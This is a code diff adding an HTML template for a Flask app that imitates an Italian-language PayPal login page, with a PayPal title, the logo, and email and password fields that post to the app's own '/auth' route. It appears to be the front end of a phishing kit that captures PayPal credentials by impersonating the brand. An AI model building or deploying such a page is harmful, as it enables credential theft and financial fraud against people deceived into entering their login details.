@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LogIn PayPal</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="div">
+        <h1 class="title">Accedi a PayPal</h1>
+        <img src="{{ url_for('static', filename='logo.png') }}" class="logo">
+        <form action="/auth" method="post">
+            <h3 class="iem">E-mail</h3>
+            <input type="email" class="iemp" autocomplete="off" name="email">
+
+            <div style="position: relative; bottom: 40px;">
+                <h3 class="iem" style="width: 89px;">Password</h3>
+                <input type="password" class="iemp" autocomplete="off" name="pass">
+            </div>
+
+            <a class="link" href="/forgot">Password dimenticata?</a>
+
+            <input type="submit" text="Accedi" class="submit" title="Accedi">
+        </form>
+    </div>
+</body>
+</html>
